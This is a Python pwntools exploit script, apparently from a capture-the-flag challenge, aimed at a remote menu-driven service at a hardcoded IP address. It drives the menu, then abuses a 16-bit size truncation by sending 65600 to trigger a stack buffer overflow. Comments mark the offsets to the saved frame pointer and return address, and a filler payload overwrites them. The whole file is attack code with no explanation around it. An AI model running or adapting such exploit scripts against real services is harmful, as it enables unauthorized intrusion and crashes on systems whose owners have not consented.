import socket
import time
from pwn import *

context.arch = "amd64"
context.log_level = "info"

HOST, PORT = "144.79.188.39", 40917

def pwn_exact():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(6)
    s.connect((HOST, PORT))

    def recv_until(delim):
        data = b""
        while delim not in data:
            chunk = s.recv(1024)
            if not chunk: break
            data += chunk
        return data

    # 1. Install example 1
    recv_until(b"-1) exit\n")
    s.sendall(b"0\n")
    recv_until(b"1) use examples\n")
    s.sendall(b"1\n")
    recv_until(b"3) kill all\n")
    s.sendall(b"1\n")
    recv_until(b"-1) exit\n")
    s.sendall(b"3\n")
    recv_until(b"-1) exit\n")
    log.success("Filter 1 installed!")

    # 2. Audit with overflow:
    s.sendall(b"5\n")
    recv_until(b"size?\n")
    # send size = 65600 (0x10040, ax=0x40 <= 0x60)
    s.sendall(b"65600\n")
    recv_until(b"note?\n")

    # buffer is at [rsp+0x40], stack size = 0xa8
    # distance to saved rbp = 0x68 (104 bytes)
    # distance to saved rip = 0x70 (112 bytes)
    # Send 256 bytes of payload to fully overwrite return address
    payload = b"A" * 104 + b"B" * 8 + b"C" * 8 + b"D" * 64
    s.sendall(payload)

    time.sleep(1)
    try:
        res = s.recv(1024)
        log.info(f"Target response: {res!r}")
    except Exception as e:
        log.info(f"Process crashed / returned: {e}")

    s.close()

if __name__ == "__main__":
    pwn_exact()
